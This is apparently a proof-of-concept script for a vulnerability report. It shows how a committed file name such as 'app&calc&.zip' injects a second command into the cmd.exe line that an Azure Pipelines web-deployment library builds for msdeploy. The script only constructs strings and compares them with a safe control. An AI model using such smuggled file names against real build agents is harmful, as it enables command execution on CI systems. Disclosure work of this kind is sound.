// Offline construction proof: a repository-globbed package file name reaches the
// cmd.exe command line that azure-pipelines-tasks-webdeployment-common builds for msdeploy.
//
// Nothing is executed, no process is spawned and no network call is made. The script only
// builds strings. process.platform is forced to win32 so azure-pipelines-task-lib takes its
// Windows command-line branch, which is the branch a Windows agent takes.
//
//   npm i azure-pipelines-tasks-webdeployment-common@4.281.0 azure-pipelines-task-lib@5.280.3
//   touch msdeploy.exe
//   node proof.js
process.env.PATHEXT = '.EXE';
Object.defineProperty(process, 'platform', { value: 'win32', configurable: true });

const fs = require('fs');
const path = require('path');
const trm = require('azure-pipelines-task-lib/toolrunner');

const PKG = path.dirname(require.resolve('azure-pipelines-tasks-webdeployment-common/package.json'));
const msdeployutility = require(path.join(PKG, 'msdeployutility.js'));

// argStringToArray is module private in the shipped deployusingmsdeploy.js, so the exact
// shipped function text is read out of that file and evaluated unmodified.
const src = fs.readFileSync(path.join(PKG, 'deployusingmsdeploy.js'), 'utf8');
const start = src.indexOf('function argStringToArray');
const fnText = src.slice(start, src.indexOf('\n}', start) + 2);
const argStringToArray = new Function(fnText + '; return argStringToArray;')();

console.log('webdeployment-common ' + require(path.join(PKG, 'package.json')).version +
            ' | task-lib ' + require('azure-pipelines-task-lib/package.json').version +
            ' | node ' + process.version);
console.log('argStringToArray lifted verbatim from the shipped file, ' + fnText.length + ' bytes');

// Node's own win32 shell handling (lib/child_process.js, normalizeSpawnArguments): with
// shell:true it runs cmd.exe /d /s /c "<file> <args joined by a single space>".
function nodeShellWrap(file, args) {
  return 'cmd.exe /d /s /c "' + [file].concat(args).join(' ') + '"';
}

// The local absolute path of the stub tool is noise, so it is printed as .\msdeploy.exe.
function redact(line) { return line.split(__dirname + path.sep).join('.\\').split(__dirname).join('.'); }

function cmdLine(argsArray, options) {
  const tr = new trm.ToolRunner(path.join(__dirname, 'msdeploy.exe'));
  argsArray.forEach(a => tr.arg(a));
  const opts = Object.assign({ cwd: process.cwd(), env: {}, silent: true,
    failOnStdErr: false, ignoreReturnCode: false }, options);
  return nodeShellWrap(tr._getSpawnFileName(opts), tr._getSpawnArgs(opts));
}

// The question that decides the bug is not whether the payload bytes appear on the line.
// It is whether the token carrying them sits inside a cmd.exe double quoted region. Inside
// one, an ampersand is a literal. Outside one, it is a command separator.
function sourceTokenIsQuoted(line) {
  const m = line.match(/(\S*-source:package=\S*)/);
  return { token: m && m[1], quoted: !!(m && m[1].charAt(0) === '"') };
}

function leg(label, fileName) {
  const pkgPath = 'C:\\agent\\_work\\1\\s\\' + fileName;
  const cmdArgs = msdeployutility.getMSDeployCmdArgs(
      pkgPath, 'MySite', null, false, false, false, null, null, null, false, false, true);
  const arr = argStringToArray(cmdArgs);
  console.log('\n=== ' + label + ' ===');
  console.log('committed file name          : ' + JSON.stringify(fileName));
  console.log('msdeployutility builds       : ' + cmdArgs.trim().split(' ')[1]);
  console.log('after argStringToArray       : ' + JSON.stringify(arr.find(a => a.indexOf('-source:package=') === 0)));

  const vuln = cmdLine(arr, { windowsVerbatimArguments: true, shell: true });
  const vq = sourceTokenIsQuoted(vuln);
  console.log('\nAS SHIPPED (windowsVerbatimArguments: true, shell: true)');
  console.log('  cmd.exe receives           : ' + redact(vuln));
  console.log('  -source token              : ' + JSON.stringify(vq.token));
  console.log('  token inside cmd quotes    : ' + vq.quoted);

  const safe = cmdLine(arr, { shell: true });
  const sq = sourceTokenIsQuoted(safe);
  console.log('\nCONTROL, identical bytes, windowsVerbatimArguments omitted');
  console.log('  cmd.exe receives           : ' + redact(safe));
  console.log('  -source token              : ' + JSON.stringify(sq.token));
  console.log('  token inside cmd quotes    : ' + sq.quoted);
}

leg('INJECTED FILE NAME', 'app&calc&.zip');
leg('CONTROL FILE NAME', 'app.zip');
